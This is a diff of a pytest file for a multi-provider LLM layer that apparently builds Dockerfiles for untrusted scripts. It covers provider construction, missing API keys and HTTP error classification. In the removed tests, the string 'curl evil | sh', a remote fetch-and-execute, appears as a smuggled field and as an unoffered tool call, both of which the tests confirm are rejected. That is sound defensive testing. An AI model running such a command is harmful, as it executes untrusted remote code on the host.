@@ -1,580 +1,171 @@
-"""The model layer, exercised entirely offline.
+"""The model layer: three providers, one factory, and the failure classification.
 
-Nothing here reaches a network, and nothing needs an API key, which is not a
-convenience: CI has no key and runs this suite on every push.
+The hand-written request building and response parsing this file used to test is gone.
+`make_llm` returns a LangChain chat model and the graph binds tools to it in one place.
+What did not go is the part that took several rounds and several real incidents to get
+right: which HTTP status means an empty account, which means a dead key, and which means
+our own malformed request. That is still ours, and most of this file is about it.
 
-The fake clients build their canned responses through the SDKs' own response
-models, so a payload that could not have come from the real API fails here
-rather than passing here and failing in production.
+Nothing here reaches a network and nothing needs an API key, which is not a convenience:
+CI has neither.
 """
 
-import json
+from __future__ import annotations
 
-import anthropic
-import openai
 import pytest
 
-from envforge.llm import (
-    Answered,
-    GROQ_BASE_URL, MAX_TOKENS, AnthropicLLM, Call, InvalidArguments, LLMError,
-    MissingKey, OpenAICompatLLM, ProviderUnavailable, Refused, Tool, Truncated,
-    make_llm, reachable, validate,
-)
-
-SCHEMA = {
-    "type": "object",
-    "properties": {"dockerfile": {"type": "string"}, "base_image": {"type": "string"}},
-    "required": ["dockerfile", "base_image"],
-    "additionalProperties": False,
-}
-TOOL = Tool("write_dockerfile", "Write a Dockerfile for the script.", SCHEMA)
-ARGS = {"dockerfile": "FROM python:3.12-slim\nCOPY s.py /s.py\n", "base_image": "python:3.12-slim"}
+from envforge.llm import (GROQ_BASE_URL, MAX_TOKENS, MissingKey, ProviderUnavailable,
+                          classify, kind_for_status, make_llm, supports_strict)
 
 
-# --- fakes ---------------------------------------------------------------------------
+class Sdk(Exception):
+    """An SDK exception in the shape both providers raise and LangChain passes through."""
 
-def _anthropic_message(*, content, stop_reason="tool_use", model="claude-sonnet-5",
-                       stop_details=None):
-    return anthropic.types.Message.model_validate({
-        "id": "msg_1", "type": "message", "role": "assistant", "model": model,
-        "content": content, "stop_reason": stop_reason, "stop_sequence": None,
-        "stop_details": stop_details,
-        "usage": {"input_tokens": 1200, "output_tokens": 340},
-    })
+    def __init__(self, message="no", status_code=None, type_=""):
+        super().__init__(message)
+        if status_code is not None:
+            self.status_code = status_code
+        self.type = type_
 
 
-def _openai_completion(*, tool_calls=None, finish_reason="tool_calls", refusal=None):
-    message = {"role": "assistant", "content": None, "refusal": refusal}
-    if tool_calls is not None:
-        message["tool_calls"] = tool_calls
-    return openai.types.chat.ChatCompletion.model_validate({
-        "id": "cmpl_1", "object": "chat.completion", "created": 0, "model": "gpt-5",
-        "choices": [{"index": 0, "finish_reason": finish_reason, "message": message}],
-        "usage": {"prompt_tokens": 900, "completion_tokens": 210, "total_tokens": 1110},
-    })
-
-
-class FakeClient:
-    """Records the kwargs it was called with and returns one canned response."""
-
-    def __init__(self, response):
-        self.response, self.seen = response, None
-
-    def _create(self, **kwargs):
-        self.seen = kwargs
-        return self.response
-
-    @property
-    def messages(self):
-        return type("_M", (), {"create": lambda _s, **kw: self._create(**kw)})()
-
-    @property
-    def chat(self):
-        completions = type("_C", (), {"create": lambda _s, **kw: self._create(**kw)})()
-        return type("_Chat", (), {"completions": completions})()
-
-
-def _anthropic(response):
-    client = FakeClient(response)
-    return AnthropicLLM("claude-sonnet-5", client=client), client
-
-
-def _openai(response, strict=True):
-    client = FakeClient(response)
-    return OpenAICompatLLM("gpt-5", strict=strict, client=client), client
-
-
-# --- the request we build, no network -----------------------------------------------
-
-def test_anthropic_forces_the_named_tool_and_asks_for_strict():
-    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request("sys", "usr", [TOOL])
-    assert request["tool_choice"] == {"type": "tool", "name": "write_dockerfile",
-                                      "disable_parallel_tool_use": True}
-    assert len(request["tools"]) == 1 and request["tools"][0]["strict"] is True
-    assert request["tools"][0]["input_schema"] is SCHEMA
-    assert request["max_tokens"] == MAX_TOKENS
-
-
-def test_openai_asks_for_strict_and_groq_does_not():
-    openai_request = OpenAICompatLLM("gpt-5", client=object()).build_request("s", "u", [TOOL])
-    groq_request = OpenAICompatLLM("llama", strict=False, client=object()).build_request("s", "u", [TOOL])
-    assert openai_request["tools"][0]["function"]["strict"] is True
-    # Groq documents its schema guarantee as not applying to tool use. Claiming
-    # strict there would be claiming a guarantee the provider does not give.
-    assert "strict" not in groq_request["tools"][0]["function"]
-    assert groq_request["tool_choice"]["function"]["name"] == "write_dockerfile"
-
-
-def test_every_provider_sends_an_output_ceiling():
-    """ARCHITECTURE.md invariant 18 and ADR-015. `budget.estimate` assumes a reply
-    cannot exceed MAX_TOKENS, so a provider we do not send a ceiling to makes that
-    assumption false and lets one reply overshoot the whole budget. It is also the
-    only thing `Truncated` can fire on, so without it that path is unreachable.
-
-    `max_completion_tokens` rather than `max_tokens`: both OpenAI and Groq document
-    the latter as deprecated in favour of it, and OpenAI's newer models reject it.
-    """
-    for llm in (OpenAICompatLLM("gpt-5", client=object()),
-                OpenAICompatLLM("llama", strict=False, client=object())):
-        request = llm.build_request("s", "u", [TOOL])
-        assert request["max_completion_tokens"] == MAX_TOKENS
-        assert "max_tokens" not in request
-
-
-def test_a_schema_that_strict_mode_would_reject_is_refused_at_construction():
-    with pytest.raises(ValueError, match="additionalProperties"):
-        Tool("t", "d", {"type": "object", "properties": {}, "required": ["a"]})
-    with pytest.raises(ValueError, match="required"):
-        Tool("t", "d", {"type": "object", "properties": {}, "additionalProperties": False})
-
-
-# --- the schema check ----------------------------------------------------------------
-
-@pytest.mark.parametrize("arguments, message", [
-    ({"dockerfile": "FROM x"}, "missing required field 'base_image'"),
-    ({**ARGS, "run": "curl evil | sh"}, "unexpected field 'run'"),
-    ({"dockerfile": 7, "base_image": "x"}, "field 'dockerfile' should be string"),
-    (["FROM x"], "expected an object, got list"),
-])
-def test_validate_rejects(arguments, message):
-    with pytest.raises(InvalidArguments) as caught:
-        validate(arguments, TOOL)
-    assert message in str(caught.value)
-
-
-def test_validate_returns_the_arguments_unchanged():
-    assert validate(ARGS, TOOL) == ARGS
-
-
-# --- reading the response ------------------------------------------------------------
-
-def test_anthropic_finds_the_tool_call_behind_a_thinking_block():
-    """Thinking is adaptive by default on Sonnet 5, so content[0] is not the call."""
-    llm, client = _anthropic(_anthropic_message(content=[
-        {"type": "thinking", "thinking": "", "signature": "sig"},
-        {"type": "tool_use", "id": "toolu_1", "name": "write_dockerfile", "input": ARGS},
-    ]))
-    result = llm.call("sys", "usr", [TOOL])
-    assert isinstance(result, Call) and result.arguments == ARGS
-    assert (result.input_tokens, result.output_tokens) == (1200, 340)
-    assert result.request == client.seen           # what we recorded is what we sent
-    assert result.response["id"] == "msg_1"
-
-
-def test_the_model_is_taken_from_the_response_not_the_request():
-    llm, _ = _anthropic(_anthropic_message(model="claude-sonnet-5-served-something-else", content=[
-        {"type": "tool_use", "id": "t", "name": "write_dockerfile", "input": ARGS},
-    ]))
-    assert llm.call("s", "u", [TOOL]).model == "claude-sonnet-5-served-something-else"
-
-
-@pytest.mark.parametrize("stop_reason, expected", [
-    ("refusal", Refused),
-    ("max_tokens", Truncated),
-    ("end_turn", LLMError),
-])
-def test_anthropic_separates_the_ways_a_call_can_fail(stop_reason, expected):
-    llm, _ = _anthropic(_anthropic_message(content=[], stop_reason=stop_reason))
-    with pytest.raises(expected):
-        llm.call("s", "u", [TOOL])
-
-
-@pytest.mark.parametrize("stop_reason, expected", [
-    ("refusal", Refused),
-    ("max_tokens", Truncated),
-    ("end_turn", LLMError),
-])
-def test_a_reply_we_cannot_use_still_reports_what_it_cost(stop_reason, expected):
-    """The budget is only a bound if every call reaches the ledger. A truncated reply
-    burned the whole output ceiling, and a loop that kept truncating would otherwise
-    walk past a budget that never charged it anything."""
-    llm, _ = _anthropic(_anthropic_message(content=[], stop_reason=stop_reason))
-    with pytest.raises(expected) as caught:
-        llm.call("s", "u", [TOOL])
-    assert caught.value.input_tokens == 1200 and caught.value.output_tokens == 340
-
-
-def test_a_reply_that_fails_the_schema_still_reports_what_it_cost():
-    """`validate` knows nothing about tokens, and a reply that fails it cost exactly
-    as much as one that passes."""
-    llm, _ = _anthropic(_anthropic_message(content=[
-        {"type": "tool_use", "id": "t", "name": "write_dockerfile",
-         "input": {"dockerfile": "FROM x", "base_image": "x", "entrypoint": "sh"}},
-    ]))
-    with pytest.raises(InvalidArguments) as caught:
-        llm.call("s", "u", [TOOL])
-    assert caught.value.input_tokens == 1200 and caught.value.output_tokens == 340
-
-
-def test_openai_reports_what_an_unusable_reply_cost_under_its_own_names():
-    llm, _ = _openai(_openai_completion(tool_calls=[{
-        "id": "call_1", "type": "function",
-        "function": {"name": "write_dockerfile", "arguments": "{not json"},
-    }]), strict=False)
-    with pytest.raises(InvalidArguments) as caught:
-        llm.call("s", "u", [TOOL])
-    assert caught.value.input_tokens == 900 and caught.value.output_tokens == 210
-
-
-def test_anthropic_validates_even_though_it_asked_for_strict():
-    llm, _ = _anthropic(_anthropic_message(content=[
-        {"type": "tool_use", "id": "t", "name": "write_dockerfile",
-         "input": {"dockerfile": "FROM x", "base_image": "x", "entrypoint": "sh"}},
-    ]))
-    with pytest.raises(InvalidArguments, match="entrypoint"):
-        llm.call("s", "u", [TOOL])
-
-
-def test_openai_parses_arguments_that_arrive_as_a_json_string():
-    llm, _ = _openai(_openai_completion(tool_calls=[{
-        "id": "call_1", "type": "function",
-        "function": {"name": "write_dockerfile", "arguments": json.dumps(ARGS)},
-    }]))
-    result = llm.call("s", "u", [TOOL])
-    assert result.arguments == ARGS and result.input_tokens == 900
-
-
-def test_openai_treats_unparseable_arguments_as_repairable():
-    """Groq's schema guarantee does not cover tool use, so this is the expected
-    Groq failure, and it has to be one more repairable outcome rather than a crash."""
-    llm, _ = _openai(_openai_completion(tool_calls=[{
-        "id": "call_1", "type": "function",
-        "function": {"name": "write_dockerfile", "arguments": "{not json"},
-    }]), strict=False)
-    with pytest.raises(InvalidArguments, match="not JSON"):
-        llm.call("s", "u", [TOOL])
-
-
-def test_a_refusal_keeps_the_reason_instead_of_flattening_it():
-    """The why arrives on the refusing response itself, so it costs no extra call.
-    Recorded and reported, never used as the verdict: the script under test wrote
-    part of the text the model formed that opinion from."""
-    llm, _ = _anthropic(_anthropic_message(content=[], stop_reason="refusal", stop_details={
-        "type": "refusal", "category": "cyber", "explanation": "looks like a credential stealer",
-    }))
-    with pytest.raises(Refused) as caught:
-        llm.call("s", "u", [TOOL])
-    assert caught.value.reason["category"] == "cyber"
-    assert "credential stealer" in caught.value.reason["explanation"]
-
-
-def test_openai_reports_a_refusal_as_a_refusal():
-    llm, _ = _openai(_openai_completion(finish_reason="stop", refusal="I cannot help with that"))
-    with pytest.raises(Refused) as caught:
-        llm.call("s", "u", [TOOL])
-    assert caught.value.reason == "I cannot help with that"
-
-
-# --- the spec string -----------------------------------------------------------------
+# --- the factory ----------------------------------------------------------------------
 
 @pytest.mark.parametrize("spec", ["anthropic", "anthropic:", ":claude", "gemini:pro", ""])
-def test_make_llm_rejects_a_bad_spec_at_startup(spec):
+def test_a_bad_spec_is_refused_at_startup(spec):
+    """Before a container is built, not in the middle of a run."""
     with pytest.raises(ValueError):
         make_llm(spec)
 
 
+def test_anthropic_gets_the_anthropic_chat_model(monkeypatch):
+    monkeypatch.setenv("ANTHROPIC_API_KEY", "sk-ant")
+    model = make_llm("anthropic:claude-sonnet-5")
+    assert type(model).__name__ == "ChatAnthropic"
+    assert model.model == "claude-sonnet-5"
+    assert model.max_tokens == MAX_TOKENS
+
+
+def test_openai_gets_the_openai_chat_model_and_no_base_url(monkeypatch):
+    monkeypatch.setenv("OPENAI_API_KEY", "sk-openai")
+    model = make_llm("openai:gpt-5")
+    assert type(model).__name__ == "ChatOpenAI"
+    assert model.model_name == "gpt-5"
+    assert not model.openai_api_base
+
+
+def test_groq_gets_the_openai_client_pointed_at_groq(monkeypatch):
+    """The same wire format through a different base url, which is how Groq was reached
+    before and is the whole reason it costs one branch rather than a third client."""
+    monkeypatch.setenv("GROQ_API_KEY", "gsk-groq")
+    model = make_llm("groq:llama-3.3-70b")
+    assert type(model).__name__ == "ChatOpenAI"
+    assert model.openai_api_base == GROQ_BASE_URL
+
+
 def test_groq_will_not_borrow_the_openai_key(monkeypatch):
-    """Two providers speak the same wire format but not with the same key. Letting
-    openai default the key would send an OpenAI secret to Groq's servers."""
+    """Two providers speak the same wire format but not with the same key. Letting the
+    client default it would send an OpenAI secret to Groq's servers and fail as a 401
+    from the wrong provider halfway through a run."""
     monkeypatch.setenv("OPENAI_API_KEY", "sk-openai")
     monkeypatch.delenv("GROQ_API_KEY", raising=False)
-    # `MissingKey` rather than `ValueError`: a missing key is not a malformed spec, and
-    # reporting it as one told the user to fix something they had typed correctly.
     with pytest.raises(MissingKey) as caught:
-        make_llm("groq:llama-3.3-70b-versatile")
+        make_llm("groq:llama-3.3-70b")
     assert caught.value.variable == "GROQ_API_KEY"
 
 
-def test_a_missing_key_is_a_provider_failure_and_not_a_usage_error(monkeypatch):
-    """Every provider, one behaviour. The Anthropic SDK is the interesting one: it does
-    not raise at construction at all, deferring auth to request time, where it raises
-    `TypeError`. That is not an `LLMError`, not a `ProviderUnavailable` and not an
-    `OSError`, so it escaped every handler in the program and crashed the run with a
-    traceback on the most common setup mistake there is."""
-    for variable in ("OPENAI_API_KEY", "GROQ_API_KEY"):
-        monkeypatch.delenv(variable, raising=False)
-    for spec in ("openai:gpt-5", "groq:llama"):
-        with pytest.raises(MissingKey):
-            make_llm(spec)
-    # And a MissingKey is a ProviderUnavailable, so the loop's handler already covers it.
-    assert issubclass(MissingKey, ProviderUnavailable)
-
-
-def test_make_llm_builds_each_provider(monkeypatch):
-    monkeypatch.setenv("ANTHROPIC_API_KEY", "test")
-    monkeypatch.setenv("OPENAI_API_KEY", "test")
-    monkeypatch.setenv("GROQ_API_KEY", "test")
-    assert isinstance(make_llm("anthropic:claude-sonnet-5"), AnthropicLLM)
-    assert isinstance(make_llm("openai:gpt-5"), OpenAICompatLLM)
-    groq = make_llm("groq:llama-3.3-70b-versatile")
-    assert groq.strict is False and str(groq._client.base_url).startswith(GROQ_BASE_URL)
-
-
-def test_anthropic_refuses_to_build_without_credentials(monkeypatch, tmp_path):
-    """Checked when the client is built, not by pattern-matching an error later.
-
-    This SDK resolves credentials from several places and raises nothing when it finds
-    none, deferring to the first request and raising `TypeError` there. That escaped
-    every handler in the program and crashed a run with a traceback on the most common
-    setup mistake there is.
-    """
-    # Every source isolated, not just the two obvious variables. The first version of
-    # this deleted two env vars and passed on a machine authenticated through a profile
-    # *because of* the bug it was meant to catch: the check read two of the SDK's three
-    # credential slots, so a profile user was told their key was not set. A test that
-    # depends on the host cannot tell you which of the two it proved.
-    for variable in ("ANTHROPIC_API_KEY", "ANTHROPIC_AUTH_TOKEN", "ANTHROPIC_PROFILE",
-                     "ANTHROPIC_CONFIG_DIR"):
-        monkeypatch.delenv(variable, raising=False)
-    monkeypatch.setenv("HOME", str(tmp_path))
+@pytest.mark.parametrize("spec, variable", [
+    ("anthropic:claude-sonnet-5", "ANTHROPIC_API_KEY"),
+    ("openai:gpt-5", "OPENAI_API_KEY"),
+    ("groq:llama-3.3-70b", "GROQ_API_KEY"),
+])
+def test_a_missing_key_is_its_own_failure_not_a_bad_spec(monkeypatch, spec, variable):
+    """Reporting a missing key as a malformed spec told the user to fix something they
+    had typed correctly. It is a `ProviderUnavailable`, so the handler already covers it
+    and the shell learns 3 rather than 2."""
+    monkeypatch.delenv(variable, raising=False)
     with pytest.raises(MissingKey) as caught:
-        AnthropicLLM("claude-sonnet-5")
-    assert caught.value.variable == "ANTHROPIC_API_KEY"
+        make_llm(spec)
+    assert caught.value.variable == variable
+    assert isinstance(caught.value, ProviderUnavailable)
 
 
-def test_a_profile_credential_is_credentials_too(monkeypatch):
-    """The regression this branch introduced and a review caught. The SDK resolves a
-    profile's bearer token into `client.credentials`, a third slot the check did not
-    read, so anyone authenticated through `ant auth login` was told their key was not
-    set. Asserted against the slot rather than against a real profile on disk, so the
-    test says the same thing on every machine."""
-    class ProfileClient:
-        api_key = None
-        auth_token = None
-        credentials = object()          # what a resolved profile leaves behind
+# --- strict schemas, and the one provider that does not promise them --------------------
 
+def test_only_the_two_providers_that_promise_a_grammar_are_asked_for_one():
+    """Groq documents its schema guarantee as not applying to tool use, so asking for
+    `strict` there would be claiming something the provider does not give. It gets a
+    forced call plus local validation instead, and the graph validates a submission on
+    every provider because it is the only check Groq has."""
+    assert supports_strict("anthropic:claude-sonnet-5")
+    assert supports_strict("openai:gpt-5")
+    assert not supports_strict("groq:llama-3.3-70b")
+
+
+# --- the failure classification ---------------------------------------------------------
+
+@pytest.mark.parametrize("status, reported, kind", [
+    (401, "", "auth"),
+    (402, "", "billing"),
+    (403, "billing_error", "billing"),
+    (403, "", "permission"),
+    (404, "", "no_such_model"),
+    (408, "", "network"),
+    (429, "", "rate_limit"),
+    (400, "", "rejected"),
+    (422, "", "rejected"),
+    (500, "", "server"),
+    (503, "", "server"),
+])
+def test_a_status_means_one_thing_everywhere(status, reported, kind):
+    """One function because there were two copies and they disagreed: one widened
+    `rejected` to every 4xx while the other stayed on 400, so the same 422 was "our bug,
+    do not retry" from a run and "provider unavailable, retry" from `--check`."""
+    assert kind_for_status(status, reported) == kind
+
+
+def test_payment_required_is_an_empty_account_and_not_our_bad_request():
+    """A blanket 4xx rule reported it as our own malformed request, telling someone out
+    of credit not to retry and that the bug was theirs."""
+    assert kind_for_status(402) == "billing"
+    assert kind_for_status(403, "billing_error") == kind_for_status(402)
+
+
+def test_forbidden_is_read_further_because_the_status_is_ambiguous():
+    """An exhausted account and a key without model access are both 403, and only the
+    provider's own error type separates them."""
+    assert kind_for_status(403, "billing_error") == "billing"
+    assert kind_for_status(403, "permission_error") == "permission"
+
+
+@pytest.mark.parametrize("status, kind", [(401, "auth"), (402, "billing"),
+                                          (429, "rate_limit"), (422, "rejected")])
+def test_classify_names_a_provider_failure(status, kind):
+    failure = classify(Sdk("no", status))
+    assert isinstance(failure, ProviderUnavailable) and failure.kind == kind
+
+
+def test_classify_passes_a_provider_unavailable_through_unchanged():
+    original = ProviderUnavailable("already named", kind="network")
+    assert classify(original) is original
+
+
+def test_a_bug_of_ours_is_not_a_provider_failure():
+    """Anything with no status is not the provider failing. Returning a tidy
+    `ProviderUnavailable` here would hide our own crash behind a report about the sample,
+    which for a tool whose only product is a judgment about untrusted code is the worst
+    failure available."""
+    assert classify(ValueError("a bug in our own code")) is None
+    assert classify(KeyError("state")) is None
+
+
+def test_a_dropped_connection_is_a_provider_failure_even_with_no_status():
+    """Matched by inheritance rather than by class name. The name test that was here
+    first missed `APITimeoutError`, which subclasses the connection error in both SDKs
+    and does not contain the word connection."""
     import anthropic
-    monkeypatch.setattr(anthropic, "Anthropic", lambda *a, **k: ProfileClient())
-    AnthropicLLM("claude-sonnet-5")      # constructs, does not raise
+    import openai
 
-
-def test_a_broken_profile_is_a_provider_failure_not_a_traceback(monkeypatch):
-    """A named profile that is missing or corrupt makes the SDK constructor itself
-    raise. Uncaught, that was the same traceback the credential check was added to
-    remove, moved one line earlier."""
-    import anthropic
-    from envforge.llm import ProviderUnavailable
-
-    def explode(*a, **k):
-        raise anthropic.AnthropicError("profile 'work' not found")
-
-    monkeypatch.setattr(anthropic, "Anthropic", explode)
-    with pytest.raises(ProviderUnavailable) as caught:
-        AnthropicLLM("claude-sonnet-5")
-    assert caught.value.kind == "no_key"
-
-
-def test_an_auth_token_is_credentials_too(monkeypatch):
-    """Checking the one environment variable would have broken this. The client's own
-    resolved values are what get asked, so the SDK's other supported method keeps
-    working."""
-    monkeypatch.delenv("ANTHROPIC_API_KEY", raising=False)
-    monkeypatch.setenv("ANTHROPIC_AUTH_TOKEN", "sk-ant-token")
-    AnthropicLLM("claude-sonnet-5")          # constructs, does not raise
-
-
-def test_the_auth_backstop_does_not_swallow_our_own_mistakes():
-    """The backstop matched the word "auth" at first, which would have turned any
-    TypeError from our own code that happened to mention authentication into "your key
-    is missing". It matches the SDK's specific phrase now."""
-    from envforge.llm import reachable
-
-    def our_bug():
-        raise TypeError("author() takes 2 positional arguments but 3 were given")
-
-    with pytest.raises(TypeError):           # re-raised, not relabelled
-        reachable(our_bug)
-
-    def sdk_says():
-        raise TypeError("Could not resolve authentication method. Expected one of "
-                        "api_key, auth_token, or credentials to be set.")
-
-    with pytest.raises(MissingKey):
-        reachable(sdk_says)
-
-
-def test_a_400_says_the_provider_refused_us_not_that_it_was_unreachable():
-    """The model was reached and answered. Two causes share the status, a prompt over
-    the context window and a malformed request, and neither is the provider being down
-    nor fixed by retrying."""
-    import httpx2 as httpx
-    request = httpx.Request("POST", "https://api.anthropic.com/v1/messages")
-    response = httpx.Response(400, request=request,
-                              json={"error": {"type": "invalid_request_error", "message": "too long"}})
-    exc = anthropic.BadRequestError("too long", response=response, body=None)
-    with pytest.raises(ProviderUnavailable) as caught:
-        reachable(lambda: (_ for _ in ()).throw(exc))
-    assert caught.value.kind == "rejected"       # not "unavailable"
-
-
-# --- more than one tool, and the conversation that needs -------------------------------
-#
-# The producing call did not change: one tool, forced by name, exactly as before. What
-# is new is that the model can be offered a choice, and that a tool result has to get
-# back to the model that asked for it.
-
-LOOK = Tool("read_script", "Read part of the script.", {
-    "type": "object",
-    "properties": {"start": {"type": "integer"}, "end": {"type": "integer"}},
-    "required": ["start", "end"],
-    "additionalProperties": False,
-})
-LOOK_ARGS = {"start": 100, "end": 200}
-
-
-def _tool_use(name="write_dockerfile", arguments=None, id="toolu_1"):
-    return {"type": "tool_use", "id": id, "name": name,
-            "input": ARGS if arguments is None else arguments}
-
-
-def _openai_tool_call(name="write_dockerfile", arguments=None, id="call_1"):
-    return {"id": id, "type": "function",
-            "function": {"name": name,
-                         "arguments": json.dumps(ARGS if arguments is None else arguments)}}
-
-
-def test_several_tools_are_still_forced_but_without_naming_one():
-    """Widened from "call this tool" to "call one of these". What did not widen is the
-    option to answer in prose: there is no path here that returns free text."""
-    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
-        "sys", "usr", [LOOK, TOOL])
-    assert request["tool_choice"] == {"type": "any", "disable_parallel_tool_use": True}
-    assert [t["name"] for t in request["tools"]] == ["read_script", "write_dockerfile"]
-
-    openai_request = OpenAICompatLLM("gpt-5", client=object()).build_request(
-        "s", "u", [LOOK, TOOL])
-    assert openai_request["tool_choice"] == "required"
-    assert openai_request["parallel_tool_calls"] is False
-
-
-def test_one_tool_goes_over_the_wire_exactly_as_it_always_did():
-    """The Dockerfile request is the one this project has been making since the model
-    layer existed, and a look loop is not a reason to change it."""
-    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
-        "sys", "usr", [TOOL])
-    assert request["tool_choice"]["type"] == "tool"
-    assert request["tool_choice"]["name"] == "write_dockerfile"
-
-
-def test_parallel_tool_calls_are_refused_on_both_providers():
-    """Not a preference. A second tool_use block in one reply never gets a tool_result,
-    and the next request is rejected for exactly that. It would also be a hole in the
-    look cap: a reply carrying four reads would cost one look."""
-    anthropic_request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
-        "s", "u", [LOOK, TOOL])
-    assert anthropic_request["tool_choice"]["disable_parallel_tool_use"] is True
-    for llm in (OpenAICompatLLM("gpt-5", client=object()),
-                OpenAICompatLLM("llama", strict=False, client=object())):
-        assert llm.build_request("s", "u", [LOOK, TOOL])["parallel_tool_calls"] is False
-
-
-def test_the_tool_that_was_called_is_reported():
-    llm, _ = _anthropic(_anthropic_message(
-        content=[_tool_use(name="read_script", arguments=LOOK_ARGS)]))
-    result = llm.call("s", "u", [LOOK, TOOL])
-    assert result.name == "read_script" and result.arguments == LOOK_ARGS
-    assert result.tool_use_id == "toolu_1"
-
-
-def test_arguments_are_checked_against_the_tool_that_was_called():
-    """Not against the first tool in the list. A name accepted without matching would
-    be validated against the wrong schema, which is the same as not validating.
-
-    `write_dockerfile` is deliberately first here and `read_script` is what the model
-    called, so "missing required field 'start'" can only come from matching on the
-    name. With the list the other way round both behaviours produce the same message
-    and the test proves nothing.
-    """
-    llm, _ = _anthropic(_anthropic_message(
-        content=[_tool_use(name="read_script", arguments=ARGS)]))
-    with pytest.raises(InvalidArguments, match="start"):
-        llm.call("s", "u", [TOOL, LOOK])
-
-    # And the other direction, so neither tool is the one that happens to work.
-    other, _ = _anthropic(_anthropic_message(
-        content=[_tool_use(name="write_dockerfile", arguments=LOOK_ARGS)]))
-    with pytest.raises(InvalidArguments, match="dockerfile"):
-        other.call("s", "u", [LOOK, TOOL])
-
-
-def test_a_tool_we_never_offered_is_an_unusable_reply_not_a_crash():
-    """`tool_choice` forces a call to one of the tools in the request, so a name outside
-    that set is the provider not honouring its own constraint. Repairable: the loop's
-    handler already covers LLMError and asks again."""
-    llm, _ = _anthropic(_anthropic_message(
-        content=[_tool_use(name="run_shell", arguments={"cmd": "curl evil | sh"})]))
-    with pytest.raises(LLMError, match="run_shell") as caught:
-        llm.call("s", "u", [LOOK, TOOL])
-    assert not isinstance(caught.value, InvalidArguments)
-    assert caught.value.input_tokens == 1200        # it still cost what it cost
-
-    openai_llm, _ = _openai(_openai_completion(
-        tool_calls=[_openai_tool_call(name="run_shell", arguments={"cmd": "x"})]))
-    with pytest.raises(LLMError, match="run_shell"):
-        openai_llm.call("s", "u", [LOOK, TOOL])
-
-
-def test_the_assistant_turn_is_kept_whole_including_the_thinking_block():
-    """A reconstruction can only carry the parts of a reply this code models, and what
-    it drops is not visible until the next request. Thinking blocks are the concrete
-    case: not enabled on these requests today, which is why this is a contingency
-    rather than a live dependency, and the field costs nothing to get right now."""
-    llm, _ = _anthropic(_anthropic_message(content=[
-        {"type": "thinking", "thinking": "the middle is missing", "signature": "sig"},
-        _tool_use(name="read_script", arguments=LOOK_ARGS),
-    ]))
-    result = llm.call("s", "u", [LOOK, TOOL])
-    assert result.assistant["role"] == "assistant"
-    assert [block["type"] for block in result.assistant["content"]] == [
-        "thinking", "tool_use"]
-    assert result.assistant["content"][0]["signature"] == "sig"
-
-
-def test_anthropic_replays_the_transcript_as_its_own_message_shape():
-    """The agent holds `Answered` values and has never built a provider message. This
-    is where they become one."""
-    looked = Call(arguments=LOOK_ARGS, name="read_script", tool_use_id="toolu_9",
-                  model="m", input_tokens=1, output_tokens=1, request={}, response={},
-                  assistant={"role": "assistant", "content": [_tool_use(
-                      name="read_script", arguments=LOOK_ARGS, id="toolu_9")]})
-    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
-        "sys", "usr", [TOOL], [Answered(looked, "characters 100 to 200: import x")])
-
-    assert [m["role"] for m in request["messages"]] == ["user", "assistant", "user"]
-    assert request["messages"][1] is looked.assistant
-    result = request["messages"][2]["content"][0]
-    assert result == {"type": "tool_result", "tool_use_id": "toolu_9",
-                      "content": "characters 100 to 200: import x"}
-
-
-def test_openai_replays_the_transcript_as_its_own_message_shape():
-    looked = Call(arguments=LOOK_ARGS, name="read_script", tool_use_id="call_9",
-                  model="m", input_tokens=1, output_tokens=1, request={}, response={},
-                  assistant={"role": "assistant", "tool_calls": [_openai_tool_call(
-                      name="read_script", arguments=LOOK_ARGS, id="call_9")]})
-    request = OpenAICompatLLM("gpt-5", client=object()).build_request(
-        "sys", "usr", [TOOL], [Answered(looked, "import x")])
-
-    assert [m["role"] for m in request["messages"]] == [
-        "system", "user", "assistant", "tool"]
-    assert request["messages"][3] == {"role": "tool", "tool_call_id": "call_9",
-                                      "content": "import x"}
-
-
-def test_openai_drops_the_null_fields_from_the_turn_it_replays():
-    """The SDK's dump carries every optional key the schema has. Sending
-    `"audio": null` back is noise at best and a 400 from a compatible provider that is
-    stricter than OpenAI about keys it does not implement."""
-    llm, _ = _openai(_openai_completion(tool_calls=[_openai_tool_call()]))
-    result = llm.call("s", "u", [TOOL])
-    assert "refusal" not in result.assistant       # it was None on the response
-    assert result.assistant["role"] == "assistant"
-    assert result.assistant["tool_calls"][0]["id"] == "call_1"
-    assert None not in result.assistant.values()
-
-
-def test_a_transcript_is_not_sent_when_there_is_nothing_in_it():
-    """The first ask of every attempt. One user message and no replay."""
-    request = AnthropicLLM("claude-sonnet-5", client=object()).build_request(
-        "sys", "usr", [TOOL])
-    assert request["messages"] == [{"role": "user", "content": "usr"}]
+    for exc in (anthropic.APIConnectionError(request=None),
+                openai.APITimeoutError(request=None)):
+        failure = classify(exc)
+        assert failure is not None and failure.kind == "network"
